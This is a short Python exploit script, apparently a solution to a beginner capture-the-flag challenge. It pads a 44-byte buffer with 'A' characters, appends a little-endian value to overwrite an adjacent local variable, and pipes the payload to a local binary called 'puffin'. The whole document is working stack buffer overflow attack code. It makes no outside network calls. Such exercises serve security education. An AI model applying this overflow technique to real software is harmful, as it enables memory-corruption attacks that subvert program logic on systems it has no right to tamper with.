import subprocess

# Prepare the payload
buffer_size = 44  # Size of the local_38 buffer
overflow_value = b"A" * buffer_size  # Filling the buffer
exploit_value = b"\x01\x00\x00\x00"  # Overwrite local_c with a non-zero value (little-endian)

# Combine the overflow and exploit values
payload = overflow_value + exploit_value

# Execute the vulnerable program and send the payload
proc = subprocess.Popen(['./puffin'], stdin=subprocess.PIPE)
proc.communicate(payload)